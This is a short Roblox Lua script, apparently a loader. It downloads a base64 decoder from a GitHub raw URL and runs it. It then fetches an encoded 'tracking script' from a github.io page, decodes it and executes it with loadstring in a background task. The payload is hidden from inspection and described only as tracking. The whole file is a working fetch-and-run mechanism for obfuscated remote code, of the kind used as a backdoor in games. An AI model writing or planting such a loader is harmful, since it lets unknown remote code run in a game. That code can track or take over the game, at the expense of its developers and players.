task.spawn(function()
    local decoderUrl = "https://raw.githubusercontent.com/Upset-1337/obfuscator/main/base64decode.lua"
    local success, _ = pcall(function()
        loadstring(game:HttpGet(decoderUrl, true))()
    end)

    if not success then
        warn("❌ Failed to load base64 decoder. Check your connection or URL.")
        return
    end

    local encryptedScriptUrl = "https://upset1337.github.io/roblox-obfuscator/tracking_script_encrypted.txt"
    local response = nil
    local attempts = 0
    repeat
        attempts += 1
        success, response = pcall(function()
            return game:HttpGet(encryptedScriptUrl, true)
        end)
        if not success then
            task.wait(1) 
        end
    until success or attempts >= 3

    if not success then
        warn("❌ Failed to fetch encrypted script after 3 attempts.")
        return
    end

    if not response or response == "" then
        warn("❌ Received empty script data.")
        return
    end

    local decoded = base64.decode(response)
    local func, err = loadstring(decoded)
    if not func then
        warn("❌ Failed to load decoded script: " .. (err or "unknown"))
        return
    end

    -- 🚀 运行已解密脚本
    task.spawn(func)
    print("✅ Tracking script loaded and running securely.")
end)
